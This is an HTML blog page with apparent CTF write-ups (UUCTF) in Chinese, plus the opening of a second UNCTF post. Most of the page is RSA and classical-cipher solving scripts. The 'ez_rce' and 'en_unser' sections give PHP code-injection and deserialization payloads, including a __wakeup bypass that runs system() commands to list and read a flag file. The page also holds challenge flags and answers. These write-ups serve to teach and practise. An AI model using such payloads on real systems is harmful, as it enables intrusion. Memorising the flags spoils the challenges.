class="number">1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span></span><br><span class="line">p = <span class="number">121216033233585299462279856144422199686140149244819402908675131452249143435823157035320400025743305736047792084067723177554239638229731651194515823556880874798950035236056266154727789682357822323822962110560589110432270068487448525123808163818606838762211746373156874518622834972063360072190758655502892772811</span></span><br><span class="line">q = <span class="built_in">pow</span>(p,<span class="number">2</span>)</span><br><span class="line">phi = <span class="built_in">pow</span>(p,<span class="number">3</span>) - <span class="built_in">pow</span>(p,<span class="number">2</span>)</span><br><span class="line">d = libnum.invmod(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;Shumu_th1nk_saf3_pr1me_ar3_importanT!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="Impossible-RSA"><a href="#Impossible-RSA" class="headerlink" title="Impossible_RSA"></a>Impossible_RSA</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import libnum</span></span><br><span class="line"><span class="comment"># from Crypto.Util.number import getPrime</span></span><br><span class="line"><span class="comment"># from flag import flag, e</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># p = getPrime(1024)</span></span><br><span class="line"><span class="comment"># q = getPrime(1024)</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line"><span class="comment"># assert e &lt;= 500000</span></span><br><span class="line"><span class="comment"># c = pow(libnum.s2n(flag), e, n)</span></span><br><span class="line"><span class="comment"># leak1 = c % q</span></span><br><span class="line"><span class="comment"># leak2 = c % p</span></span><br><span class="line"><span class="comment"># leak3 = p + q</span></span><br><span class="line"><span class="comment"># print(&quot;n =&quot;, n)</span></span><br><span class="line"><span class="comment"># print(&quot;leak1 =&quot;, leak1)</span></span><br><span class="line"><span class="comment"># print(&quot;leak2 =&quot;, leak2)</span></span><br><span class="line"><span class="comment"># print(&quot;leak3 =&quot;, leak3)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#求p,q</span></span><br><span class="line"><span class="comment"># import sympy</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 21256406304024147327122699985764737895162788854942201173538004689536569610046157311527715126074775927977409773971656249943602454790380966869525211733301201659688694473703188427037879868522859419364680904585572399937639393418586498509580133474303442722716959873727260844993296681950092753897902540593927952622713860163782763263944291810729056735965535138964485886748344167499818148134252327820007439830749462775149754781930983094046362696040641091039506998835624218220892441813224657845627120344960554424765109502415773475619490661527184126374299883610442465428985757004551740482644952396990065188807827114495184096249</span></span><br><span class="line"><span class="comment"># leak1 = 8842431959638543756327530752221031675897458993985909403335303147413741167900365489182674478419510549838159493192002672500346433589707076289344572454304647803237654059883974235710442126617587691632375039292283285577033977676131772115877520248352227419433136507412485140428972344000541898060766721412300525883</span></span><br><span class="line"><span class="comment"># leak2 = 127414092867622693231378230621806169422569654246682818498761930473755998913688181327473434110121174292309611256339271412324673262030535400937563769685033472683498585742711576446343086462569783541192470920638935990937187809422965809986860709074542257475025562691683977493260026623616012846939417988284096473040</span></span><br><span class="line"><span class="comment"># leak3 = 293130152177150437492580785085598394773458388719469800871702200331766258900690595210759869625006484354799804558552583572062231998451041105464048317708732987121458633718573774164071597186461239762511364549980544029915308083867329707804739776241438307060614946195675715671343671137725809499387682363101164970886</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># p = sympy.Symbol(&#x27;p&#x27;)#方程组定义变量</span></span><br><span class="line"><span class="comment"># q = sympy.Symbol(&#x27;q&#x27;)</span></span><br><span class="line"><span class="comment"># m1 = p + q - leak3</span></span><br><span class="line"><span class="comment"># m2 = p*q - n</span></span><br><span class="line"><span class="comment"># result = sympy.solve([m2,m1],[q,p])</span></span><br><span class="line"><span class="comment"># p = result[1][0]</span></span><br><span class="line"><span class="comment"># q = result[1][1]</span></span><br><span class="line"><span class="comment"># print(p+q)</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="comment">#求c</span></span><br><span class="line"><span class="comment"># import gmpy2</span></span><br><span class="line"><span class="comment"># import functools</span></span><br><span class="line"><span class="comment"># leak1 = 8842431959638543756327530752221031675897458993985909403335303147413741167900365489182674478419510549838159493192002672500346433589707076289344572454304647803237654059883974235710442126617587691632375039292283285577033977676131772115877520248352227419433136507412485140428972344000541898060766721412300525883</span></span><br><span class="line"><span class="comment"># leak2 = 127414092867622693231378230621806169422569654246682818498761930473755998913688181327473434110121174292309611256339271412324673262030535400937563769685033472683498585742711576446343086462569783541192470920638935990937187809422965809986860709074542257475025562691683977493260026623616012846939417988284096473040</span></span><br><span class="line"><span class="comment"># p = 161562249983202700035527081166558786031731223261198195999535987465827171883730733359944156020947215855022510635343983292897557354440470230745496731228302894376018866016596714241754815953745113727125200716224341010140868299262202025976056483744622119807303134689795661748036502596285135565503272596613700276343</span></span><br><span class="line"><span class="comment"># q = 131567902193947737457053703919039608741727165458271604872166212865939087016959861850815713604059268499777293923208600279164674644010570874718551586480430092745439767701977059922316781232716126035386163833756203019774439784605127681828683292496816187253311811505880053923307168541440673933884409766487464694543</span></span><br><span class="line"><span class="comment"># def CRT(mi, ai):</span></span><br><span class="line"><span class="comment">#     # mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line"><span class="comment">#     # Chinese Remainder Theorem</span></span><br><span class="line"><span class="comment">#     assert (isinstance(mi, list) and isinstance(ai, list))</span></span><br><span class="line"><span class="comment">#     M = functools.reduce(lambda x, y: x * y, mi)</span></span><br><span class="line"><span class="comment">#     ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) for (m, a) in zip(mi, ai)]</span></span><br><span class="line"><span class="comment">#     return functools.reduce(lambda x, y: x + y, ai_ti_Mi) % M</span></span><br><span class="line"><span class="comment"># print(CRT([p,q],[leak2,leak1]))</span></span><br><span class="line"><span class="comment"># #</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">49333</span></span><br><span class="line"><span class="comment"># c = 17431785835448961043859261315176288401566897635242802779223179191586051568502129723405988597934098406136452124086691395820535287880399796936679536014864454358414280944146420090803301734567846096671469665943122284125460393629919656472016204629268365464527631452362135617958549984167918731877279978373216172745252114501071952316225108779903786223880900111253475978779987190816907059958151040417717948214119214022275866036117533690908516698257151038714990849359728367630245354088623657069197243123992414029445546670792061100574970848370880757736957657188088000537248398978275307423124105368394831768224360130420560928591</span></span><br><span class="line"><span class="comment"># c = 22770122824321633115912971825455908687355382455045454571705704690952291322481511160730887869058862732082938259964873518549282801291480023621164456866675823033615112134707695914501857504810427675491749515262338634897770912428069575542658585834016589453429998202472108150395872255742766808098607542366119238049827700517324253555848273103545741173860889988033732803979471867442572549436584137491914091815352759870752703050324084234064754734337560733929308712765145094917275935838039936048676125768788180346996240649957625553766984801712082446523595467203047833266290134224103170539631882579941524894829078335447533983</span></span><br><span class="line">c = <span class="number">3824620468575186283263438670588449493595891219699398394314825497950518041544027588121726528140677521840957649884964854123067166909981169932845675718436747301274413529556768336234578133955013322693211238642450115812178999788666842037563928845035077258189328421365125227034746697782174022020622562220711779877598002187538072184706888792199297713183102140951678635870454210304080828257689834218945600205170933595021659495344723487962865693403732529551424491615233971077383327527196551458483405810155511628144408791554931651558741600255400950740080455745248949786196057225372895693209845996211788165583651693771020166581</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">21256406304024147327122699985764737895162788854942201173538004689536569610046157311527715126074775927977409773971656249943602454790380966869525211733301201659688694473703188427037879868522859419364680904585572399937639393418586498509580133474303442722716959873727260844993296681950092753897902540593927952622713860163782763263944291810729056735965535138964485886748344167499818148134252327820007439830749462775149754781930983094046362696040641091039506998835624218220892441813224657845627120344960554424765109502415773475619490661527184126374299883610442465428985757004551740482644952396990065188807827114495184096249</span></span><br><span class="line">p = <span class="number">161562249983202700035527081166558786031731223261198195999535987465827171883730733359944156020947215855022510635343983292897557354440470230745496731228302894376018866016596714241754815953745113727125200716224341010140868299262202025976056483744622119807303134689795661748036502596285135565503272596613700276343</span></span><br><span class="line">q = <span class="number">131567902193947737457053703919039608741727165458271604872166212865939087016959861850815713604059268499777293923208600279164674644010570874718551586480430092745439767701977059922316781232716126035386163833756203019774439784605127681828683292496816187253311811505880053923307168541440673933884409766487464694543</span></span><br><span class="line"><span class="built_in">print</span>(p*q)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;c59d5fc3-610c-41ca-baef-b26f9a88648d&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h1 id="disparity-rsa"><a href="#disparity-rsa" class="headerlink" title="disparity_rsa"></a>disparity_rsa</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># import libnum</span></span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># n = getPrime(16) * getPrime(1024)</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># c = pow(libnum.s2n(flag), e, n)</span></span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">5766276392358749678465293140086098467966750231712371312128357014391999737216038752230724284342592823121355823795866483203180931048954335112770774107559486755364212210458976151334722695492171477074797849017986146274077476865962084775522903856595231226401087381140264069846311320790344977681853590320235273290951697</span></span><br><span class="line"><span class="string">2045715881946911272235143200802867525029545408884378407157206152052553006168468197781701884100551265225998396305370344041310549543210998337911706435156837312343915033047602409702498958543942876869008345155456133353563984395357862622021564371486943574405858053628504628093173853945529577974028398631861979247502108s</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">5766276392358749678465293140086098467966750231712371312128357014391999737216038752230724284342592823121355823795866483203180931048954335112770774107559486755364212210458976151334722695492171477074797849017986146274077476865962084775522903856595231226401087381140264069846311320790344977681853590320235273290951697</span></span><br><span class="line">c = <span class="number">2045715881946911272235143200802867525029545408884378407157206152052553006168468197781701884100551265225998396305370344041310549543210998337911706435156837312343915033047602409702498958543942876869008345155456133353563984395357862622021564371486943574405858053628504628093173853945529577974028398631861979247502108</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">100824891894856702601201118009583648965164977561371042858637845367138181483380929730739526924561431398670347148954669147299066829552802628259180187574259704417901631558444093499584247442642574479809722666468258052387219612630695122930581802321960294913554359621973108878080665153439264529066699136581547328967</span></span><br><span class="line">q = <span class="number">57191</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h1 id="爱丽丝梦境的兔子"><a href="#爱丽丝梦境的兔子" class="headerlink" title="爱丽丝梦境的兔子"></a>爱丽丝梦境的兔子</h1><p>题目描述</p>
<p>一只没有钥匙的兔子背着社会主义核心价值观跳过6排栅栏</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19ixL7s5HryOhyL5oSScYGNVBVWl+sUMYQwTRniXreqeSp/iTHtkcxt</span><br><span class="line">qicNL4xpHc5X34Daat7ixqkZMpU4JV9USOKKTAw9HJfGnoDzFF/JY0gzJpxgmW1X</span><br><span class="line">4nXktQ4J7OM14EMcTrhPDIOfG2VDJr4yViWc/vNS8np1IFeIRXMoWGAJHuI8IOVG</span><br><span class="line">tXi2JX6hTseYkJc2LGHJkLQ0WDW67RyhPC3vOwmJHOs/wMefWCaYteoQYOCReltm</span><br><span class="line">FYuuibegOvFSUl1f0Tu7488mBHNjTrDSC76HjgxJJ6h9P36mLucQUBiFMyjLe0k1</span><br><span class="line">+TTb39iMaGCuPiDb0UoAcAZPolz7RCeXqZOdzcJsPIFK/tcFLGeOPJTfFhJiwga6</span><br><span class="line">cENO7pqeIB1qsRqEjyO4m4wgkhugdcs10CCevOJxNiQaWtv/FIOw9oCi5Q0VP+C9</span><br><span class="line">qXZbuQ==</span><br></pre></td></tr></table></figure>

<p>根据题目描述先进行Rabbit解码</p>
<p>然后社会主义核心价值观解密</p>
<p>然后栅栏密码解密</p>
<h1 id="easy-base64"><a href="#easy-base64" class="headerlink" title="easy_base64"></a>easy_base64</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line">b=<span class="number">90</span></span><br><span class="line">a=[<span class="number">55</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">105</span> ,<span class="number">71</span> ,<span class="number">14</span> ,<span class="number">27</span>, <span class="number">41</span>, <span class="number">30</span>, <span class="number">34</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">111</span>, <span class="number">74</span>, <span class="number">62</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">54</span>, <span class="number">52</span> ,<span class="number">106</span>, <span class="number">85</span>, <span class="number">31</span>, <span class="number">54</span>, <span class="number">24</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">11</span>, <span class="number">38</span>, <span class="number">1</span>, <span class="number">53</span>, <span class="number">17</span>, <span class="number">37</span> ,<span class="number">17</span> , <span class="number">35</span>, <span class="number">47</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">40</span>, <span class="number">2</span> ,<span class="number">9</span> ,<span class="number">59</span>, <span class="number">47</span>, <span class="number">54</span> ,<span class="number">25</span>, <span class="number">111</span>, <span class="number">77</span>, <span class="number">16</span>, <span class="number">48</span> ,<span class="number">26</span> ,<span class="number">33</span> ,<span class="number">9</span> ,<span class="number">55</span>, <span class="number">108</span> ,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">      b=a[i]^b</span><br><span class="line">      f+=<span class="built_in">chr</span>(a[i]^b)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">f+=<span class="string">&#x27;=&#x27;</span>     <span class="comment">#异或以后发现少一个=，但是问题不大</span></span><br><span class="line">flag=base64.b64decode(<span class="built_in">bytes</span>(f,<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h1 id="简单的数学"><a href="#简单的数学" class="headerlink" title="简单的数学"></a>简单的数学</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># import libnum</span></span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># p = getPrime(1024)</span></span><br><span class="line"><span class="comment"># q = getPrime(1024)</span></span><br><span class="line"><span class="comment"># n = p*q</span></span><br><span class="line"><span class="comment"># k = getRandomNBitInteger(20)</span></span><br><span class="line"><span class="comment"># c=pow(libnum.s2n(flag)*p+k*n,e,n)</span></span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line"><span class="comment"># print(k)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 462592082768349080220909549757344916952259805582738138946967136528358314821753717325227038311476341057261616824882300840971094398108671686730634522953199485320477369825037835494264368612594110910697087675588798023343938150586183916552348143352032916901783618890855526008248299448901123776094889945844121087885252580121628395910419946496994972305258850973957286676894473867869392346778460319</span></span><br><span class="line"><span class="comment"># 25014963863951112347974440214066273048882503259160338255496299775995961351901571648895465031685356024238885233929337483853960374743565692563404769039019561050421788096283392820458449077490390195564801845037357811298274797645813808259301937466827199149702646030007667049110326436048932024335483846993690455310182909643176845321021209137548742937430940258997221937352498631551209822079559591857076641561863821325180714184637516327495056825200929458796589533188382551310078527193764723189551017851538326522660734366263229681834096022505151628784267513086843047784002223603418978827233728149657480292961095596638702578233</span></span><br><span class="line"><span class="comment"># 930971</span></span><br><span class="line"><span class="comment"># 21332979626247382647148222928588089621511790656630926013612529289276199934646065751526142377438330548167579869346422391777913473113228287023801928140946948279096562923728186040013041739656216576467903409087827269164764659636977412246373447194249307513950780025367450729199178539765363446611686879821064068711525543800807969264271445173422813211738947698740537888866771159352960700295474589207758542367193701819811125602611901272496121027126921035697692984486226677539547135753720071134145590716156803665486826826046693205511230289946748601632769198172373201803516681379607412290191420859001274915183415061321376410345</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">25014963863951112347974440214066273048882503259160338255496299775995961351901571648895465031685356024238885233929337483853960374743565692563404769039019561050421788096283392820458449077490390195564801845037357811298274797645813808259301937466827199149702646030007667049110326436048932024335483846993690455310182909643176845321021209137548742937430940258997221937352498631551209822079559591857076641561863821325180714184637516327495056825200929458796589533188382551310078527193764723189551017851538326522660734366263229681834096022505151628784267513086843047784002223603418978827233728149657480292961095596638702578233</span></span><br><span class="line">k = <span class="number">930971</span></span><br><span class="line">c = <span class="number">21332979626247382647148222928588089621511790656630926013612529289276199934646065751526142377438330548167579869346422391777913473113228287023801928140946948279096562923728186040013041739656216576467903409087827269164764659636977412246373447194249307513950780025367450729199178539765363446611686879821064068711525543800807969264271445173422813211738947698740537888866771159352960700295474589207758542367193701819811125602611901272496121027126921035697692984486226677539547135753720071134145590716156803665486826826046693205511230289946748601632769198172373201803516681379607412290191420859001274915183415061321376410345</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n,c)</span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line">flag =m // p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(flag)))</span><br></pre></td></tr></table></figure>



<h1 id="王八快跑"><a href="#王八快跑" class="headerlink" title="王八快跑"></a>王八快跑</h1><p>打开得到一个exe文件让他运行最后就得到flag</p>
<h1 id="搬好小板凳听故事"><a href="#搬好小板凳听故事" class="headerlink" title="搬好小板凳听故事"></a>搬好小板凳听故事</h1><h1 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h1><p>?&gt;&lt;?&#x3D;<code>l\s /</code></p>
<p><code>?&gt;&lt;?=ca&quot;&quot;t /fffffffffflagafag </code>;</p>
<p>NSSCTF{This_IS_s0_easy_RCE}</p>
<h1 id="en-unser"><a href="#en-unser" class="headerlink" title="en_unser"></a>en_unser</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>



<p>主要是绕过__wakeup这个魔术方法  本来的思路就是CVE但是不行</p>
<p>所以只能从题目中所给的的三个魔法方法下手</p>
<p><img src="/2023/02/01/UUCTF/1666365899965.png" alt="1666365899965"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;s:15:&quot;system(&#x27;ls /&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/2023/02/01/UUCTF/1666366018563.png" alt="1666366018563"></p>
<p><strong><img src="/2023/02/01/UUCTF/1666366051669.png" alt="1666366051669"></strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;s:33:&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure>





<p><img src="/2023/02/01/UUCTF/1666366086629.png" alt="1666366086629"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UUCTF/" rel="tag">UUCTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-UNCTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/01/UNCTF/"
    >2022UNCTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/01/UNCTF/" class="article-date">
  <time datetime="2023-02-01T07:45:03.000Z" itemprop="datePublished">2023-02-01</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="MD5-1"><a href="#MD5-1" class="headerlink" title="MD5-1"></a>MD5-1</h2><p>发现out.txt里面都是经过md5加密后的密文  本来想通过直接读取文件写的  但是报错  就通过把内容手写到一个列表里</p>
<p>然后通过脚本爆破得到</p>
